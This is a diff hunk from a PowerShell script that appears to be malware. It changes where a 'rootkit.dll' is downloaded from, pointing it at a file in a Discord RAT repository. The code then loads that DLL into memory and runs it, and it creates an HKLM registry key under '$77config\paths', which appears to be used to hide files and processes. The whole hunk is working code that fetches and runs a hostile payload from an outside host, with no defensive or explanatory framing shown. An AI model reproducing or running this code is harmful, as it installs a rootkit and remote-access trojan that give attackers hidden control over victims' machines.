@@ -160,7 +160,7 @@ if ($Run) {
 
     # --- ROOTKIT ---
     try {
-        $bytes = (New-Object Net.WebClient).DownloadData("https://github.com/UnfairAdventage/AutoMine/raw/refs/heads/main/rootkit.dll")  
+        $bytes = (New-Object Net.WebClient).DownloadData("https://raw.githubusercontent.com/moom825/Discord-RAT-2.0/master/Discord%20rat/Resources/rootkit.dll")  
         $asm = [Reflection.Assembly]::Load($bytes)  
         $asm.EntryPoint.Invoke($null, @([string[]]@())) | Out-Null
         $rk = [Microsoft.Win32.Registry]::LocalMachine.CreateSubKey('SOFTWARE\$77config\paths')  
